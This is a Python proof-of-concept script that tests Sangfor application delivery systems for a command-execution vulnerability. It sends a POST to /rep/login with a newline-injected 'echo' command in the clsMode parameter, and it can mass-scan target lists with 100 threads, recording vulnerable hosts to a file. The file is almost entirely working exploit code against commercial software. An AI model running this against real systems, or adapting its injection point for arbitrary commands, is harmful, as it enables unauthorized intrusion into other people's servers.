import requests,sys,argparse,os,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """                   
__________________ 
__  ___/  ___/  _ \
_  /   / /__ /  __/
/_/    \___/ \___/ 
                   """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='深信服应用交付系统命令执行漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload = '/rep/login'
    headers = {
        'Connection':'close',
        'Content-Type':'application/x-www-form-urlencoded',
        'Content-Length':'124'
    }
    data = 'clsMode=cls_mode_login%0Aecho%20jqjjqj%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123'
    try:
        res = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=10)
        if 'jqjjqj' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
    except Exception as e:
        print(f'[!]网站异常，请手工测试：{target}')


if __name__ == '__main__':
    main()